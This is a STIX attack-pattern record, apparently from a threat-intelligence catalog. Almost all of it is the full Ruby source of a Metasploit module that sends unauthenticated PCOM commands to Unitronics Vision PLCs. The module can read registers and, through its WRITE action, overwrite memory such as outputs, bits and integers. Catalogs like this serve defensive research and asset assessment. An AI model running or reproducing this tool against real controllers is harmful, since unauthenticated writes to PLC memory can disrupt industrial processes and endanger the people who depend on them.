{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8a547a22-bdf6-4da0-9731-3c851f66e041",
    "created": "2024-08-14T16:26:49.087941Z",
    "modified": "2024-08-14T16:26:49.087945Z",
    "name": "Unitronics PCOM Client",
    "description": " Unitronics Vision PLCs allow unauthenticated PCOM commands to query PLC registers. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/scada/pcomclient.rb",
            "external_id": "pcomclient.rb"
        },
        {
            "source_name": "reference",
            "url": "https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Unitronics PCOM Client',\n      'Description'   => %q{\n        Unitronics Vision PLCs allow unauthenticated PCOM commands\n        to query PLC registers.\n      },\n      'Author'         => [ 'Luis Rosa <lmrosa[at]dei.uc.pt>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf' ]\n        ],\n      'Actions'        =>\n        [\n          ['READ', { 'Description' => 'Read values from PLC memory' } ],\n          ['WRITE', { 'Description' => 'Write values to PLC memory' } ]\n        ],\n      'DefaultAction' => 'READ'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(20256),\n        OptInt.new('UNITID', [ false, 'Unit ID (0 - 127)', 0]),\n        OptInt.new('ADDRESS', [true, \"PCOM memory address (0 - 65535)\", 0]),\n        OptInt.new('LENGTH', [true, \"Number of values to read (1 - 255) (read only)\", 3]),\n        OptString.new('VALUES', [false, \"Values to write (0 - 65535 each) (comma separated) (write only)\"]),\n        OptEnum.new(\"OPERAND\", [true, 'Operand type', \"MI\", [\"Input\", \"Output\", \"SB\", \"MB\", \"MI\", \"SI\", \"ML\", \"SL\", \"SDW\",\"MDW\"]])\n      ])\n  end\n\n  # compute and return the checksum of a PCOM ASCII message\n  def pcom_ascii_checksum(msg)\n    (msg.each_byte.inject(:+) % 256 ).to_s(16).upcase.rjust(2, '0')\n  end\n\n  # compute and return the pcom length\n  def pcom_ascii_len(pcom_ascii)\n    Rex::Text.hex_to_raw(pcom_ascii.length.to_s(16).rjust(4,'0').unpack('H4H4').reverse.pack('H4H4'))\n  end\n\n  # return a pcom ascii formatted request\n  def pcom_ascii_request(command)\n    unit_id = datastore['UNITID'].to_s(16).rjust(2,'0')\n    # PCOM/ASCII\n    pcom_ascii_payload = \"\" +\n      \"\\x2f\" + # '/'\n      unit_id +\n      command +\n      pcom_ascii_checksum(unit_id + command) + # checksum\n      \"\\x0d\" # '\\r'\n\n    # PCOM/TCP header\n    Rex::Text.rand_text_hex(2) + # transaction id\n      \"\\x65\" + # ascii (101)\n      \"\\x00\" + # reserved\n      pcom_ascii_len(pcom_ascii_payload) + # length\n      pcom_ascii_payload\n  end\n\n  def read\n    if datastore['LENGTH'] + datastore['ADDRESS'] > 65535\n      print_error(\"Invalid ADDRESS\")\n      return\n    end\n\n    case datastore['OPERAND']\n    when \"Input\"\n      cc = \"RE\"\n    when \"Output\"\n      cc = \"RA\"\n    when \"SB\"\n      cc = \"GS\"\n    when \"MB\"\n      cc = \"RB\"\n    when \"MI\"\n      cc = \"RW\"\n    when \"SI\"\n      cc = \"GF\"\n    when \"ML\"\n      cc = \"RNL\"\n    when \"SL\"\n      cc = \"RNH\"\n    when \"SDW\"\n      cc = \"RNJ\"\n    when \"MDW\"\n      cc = \"RND\"\n    else\n      print_error(\"Unknown operand #{datastore['OPERAND']}\")\n      return\n    end\n\n    address = datastore['ADDRESS'].to_s(16).rjust(4,'0')\n    length = datastore['LENGTH'].to_s(16).rjust(2,'0')\n    print_status(\"Reading #{length} values (#{datastore['OPERAND']}) starting from #{address} address\")\n    sock.put(pcom_ascii_request(cc + address + length))\n    sock.get_once\n  end\n\n  def print_read_ans(ans)\n    cc = ans[0..1]\n    data = ans[2..ans.length]\n    start_addr = datastore['ADDRESS']\n    case cc\n    when \"RE\"\n      size = 1\n    when \"RA\"\n      size = 1\n    when \"RB\"\n      size = 1\n    when \"GS\"\n      size = 1\n    when \"RW\"\n      size = 4\n    when \"GF\"\n      size = 4\n    when \"RN\"\n      size = 8\n    else\n      print_error(\"Unknown answer #{cc}\")\n      return\n    end\n    data.scan(/.{#{size}}/).each_with_index {|val, i|\n      print_good(\"[#{(start_addr + i).to_s.rjust(5,'0')}] : #{val.to_i(16)}\")}\n  end\n\n  def write\n    values = datastore['VALUES'].split(\",\")\n    case datastore['OPERAND']\n    when \"Input\"\n      print_error(\"Input operand is read only\")\n      return\n    when \"Output\"\n      cc = \"SA\"\n    when \"SB\"\n      cc = \"SS\"\n    when \"MB\"\n      cc = \"SB\"\n    when \"MI\"\n      cc = \"SW\"\n    when \"SI\"\n      cc = \"SF\"\n    when \"ML\"\n      cc = \"SNL\"\n    when \"SL\"\n      cc = \"SNH\"\n    when \"SDW\"\n      cc = \"SDJ\"\n    when \"MDW\"\n      cc = \"SND\"\n    else\n      print_error(\"Unknown operand #{datastore['OPERAND']}\")\n      return\n    end\n\n    address = datastore['ADDRESS'].to_s(16).rjust(4,'0')\n    length = values.length.to_s(16).rjust(2,'0')\n    values_to_write = values.map{|s| s.to_i(10).to_s(16).rjust(4,'0')}.join\n    print_status(\"Writing #{length} #{datastore['OPERAND']} (#{datastore['VALUES']}) starting from #{address} address\")\n    sock.put(pcom_ascii_request(cc + address + length + values_to_write))\n    sock.get_once\n  end\n\n  def run\n    connect\n    case action.name\n    when \"READ\"\n      if datastore['LENGTH'] == nil\n        print_error(\"The option VALUES is not set\")\n        return\n      else\n        ans = read\n        if ans == nil\n          print_error(\"No answer from PLC\")\n          return\n        end\n        print_read_ans(ans.to_s[10..(ans.length-4)])\n      end\n    when \"WRITE\"\n      if datastore['VALUES'] == nil\n        print_error(\"The option VALUES is not set\")\n        return\n      else\n        ans = write\n        if ans == nil\n          print_error(\"No answer from PLC\")\n          return\n        end\n      end\n    else\n      print_error(\"Unknown action #{action.name}\")\n    end\n  end\nend\n"
}